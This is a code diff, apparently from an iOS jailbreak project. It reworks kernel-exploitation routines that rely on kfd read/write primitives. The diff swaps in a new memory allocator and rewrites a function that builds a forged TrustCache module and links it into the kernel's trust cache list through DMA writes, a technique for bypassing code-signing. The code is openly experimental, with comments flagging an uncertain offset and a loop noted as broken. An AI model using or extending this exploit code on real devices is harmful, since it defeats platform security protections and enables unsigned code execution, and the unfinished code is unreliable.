@@ -488,7 +488,8 @@ int SwitchSysBinOld(uint64_t vnode, char* what, char* with)
     }
     return 0;
 }
-uint64_t kalloc(size_t size) {
+uint64_t alloc(size_t size) {
+    /*
     uint64_t begin = get_kernel_proc();
     uint64_t end = begin + 0x40000000;
     uint64_t addr = begin;
@@ -505,6 +506,8 @@ uint64_t kalloc(size_t size) {
         }
         if (found) {
             NSLog(@"[+] dirty_kalloc: 0x%llx\n", addr);
+            UInt64 towrite = 0x414141414;
+            kwritebuf_kfd(addr, &towrite, size);
             return addr;
         }
         addr += 0x1000;
@@ -514,6 +517,11 @@ uint64_t kalloc(size_t size) {
         exit(EXIT_FAILURE);
     }
     return 0;
+     */
+    // Allocate better hopefully.
+    UInt64 toreturn = 0;
+    vm_allocate(mach_task_self(), (vm_address_t*)&toreturn, size, VM_FLAGS_ANYWHERE);
+    return toreturn;
 }
 uint64_t SwitchSysBin(char* to, char* from, uint64_t* orig_to_vnode, uint64_t* orig_nc_vp)
 {
@@ -582,38 +590,59 @@ size_t kwritebuf_tcinject(uint64_t where, const void *p, size_t size) {
     return size;
 }
 void tcinjecttest(void) {
-    UInt64 pmap_image4_trust_cachesstaticdkifworks = 0xFFFFFFF0078718C0;
-    UInt64 mem = kalloc(0x1000);
+    UInt64 pmap_image4_trust_caches = 0xfffffff007c084d8 /*MAYBE??!*/ + get_kernel_slide(); //still need to figure out how to find this damn offset lol.
+    UInt64 mem = alloc(0x4000);
+    UInt64 payload = alloc(0x4000);
     if(mem == 0) {
-        NSLog(@"Failed to allocate kernel memory for TrustCache: %p",mem);
+        NSLog(@"Failed to allocate memory for TrustCache: %p",mem);
         exit(EXIT_FAILURE); // ensure no kpanics
     }
-    UInt64 next = mem;
-    UInt64 us = mem + 0x8;
-    UInt64 tc = mem + 0x10;
-    NSLog(@"writing in us: %p",us);
-    kwrite64_kfd(us,mem + 0x10);
-    NSLog(@"Writing in tc: %p",tc);
-    kwrite32_kfd(tc, 0x1); // version
-    NSLog(@"Wrote version.");
-    kwritebuf_kfd(tc + 0x4, &"blackbathingsuit", 17); // don't ask
-    NSLog(@"Wrote blackbathingsuit.");
-    kwrite32_kfd(tc + 0x14, 22 * 100); // full page of entries
-    NSLog(@"Wrote full page of entries");
-    UInt64 pitc = pmap_image4_trust_cachesstaticdkifworks + get_kernel_slide();
-    NSLog(@"If stuff goes wrong, it's going wrong here!");
-    UInt64 cur = kread64_ptr_kfd(pitc);
-    NSLog(@"Cur: %p",cur);
-    if(cur == 0) {
-        NSLog(@"Failed to read TrustCache head!");
-        exit(EXIT_FAILURE); // ensure no kpanics
+    NSLog(@"Writing blackbathingsuit!");
+    NSString  *str = @"blackbathingsuit";
+    NSData *data = [str dataUsingEncoding: NSASCIIStringEncoding];
+    memcpy((void*)payload,data.bytes,data.length);
+    NSLog(@"Wrote blackbathingsuit!");
+    sleep(1);
+    NSLog(@"Writing payload!");
+    UInt64 payloadpaddr = vtophys_kfd(payload);
+    UInt64 payloadkaddr = phystokv_kfd(payloadpaddr);
+    memcpy((void*)mem + offsetof(trustcache_module, fileptr), &payloadkaddr, sizeof(UInt64));
+    NSLog(@"Wrote payload!");
+    sleep(1);
+    NSLog(@"Writing length!");
+    UInt64 len = data.length;
+    memcpy((void*)mem + offsetof(trustcache_module, module_size),&len,sizeof(UInt64));
+    NSLog(@"Wrote length!");
+    sleep(1);
+    UInt64 mempaddr = vtophys_kfd(mem);
+    UInt64 memkaddr = phystokv_kfd(mempaddr);
+    UInt64 trustcache = kread64_ptr_kfd(pmap_image4_trust_caches);
+    NSLog(@"Beginning trustcache insertion!");
+    if(!trustcache) {
+        dma_perform(^{
+            dma_writevirt64(pmap_image4_trust_caches, memkaddr);
+        });
+        NSLog(@"Trustcache didn't already exist, write our stuff directly, and skip to end.");
+        goto done;
     }
-    kwrite64_kfd(next, cur);
-    NSLog(@"wrote in cur %p",cur);
+    UInt64 prev = 0;
+    NSLog(@"Entering while(trustcache)!");
+    sleep(1);
+    /*
+    while(trustcache) {
+        prev = trustcache;
+        trustcache = kread64_ptr_kfd(trustcache);
+    } */ // knew this was broken.
+    prev = trustcache;
+    NSLog(@"Entering dma_perform!");
+    sleep(1);
     dma_perform(^{
-       //Replace head
-        dma_writevirt64(pitc, mem);
+        NSLog(@"Entered dma_perform!");
+        dma_writevirt64(prev, memkaddr);
+        dma_writevirt64(memkaddr+8, prev);
     });
+done:
+    sleep(1);
     NSLog(@"TrustCache Successfully loaded!");
 }
 UInt64 load_telescope(void)
@@ -733,5 +762,9 @@ UInt64 load_telescope(void)
     return 0;
 }
 UInt64 testKalloc(void) {
-    return kalloc(0x1000); //start small.
+    return 0x1; //version counter for sora, makes sure I actually updated
+}
+UInt64 testTC(void) {
+    tcinjecttest();
+    return 0;
 }
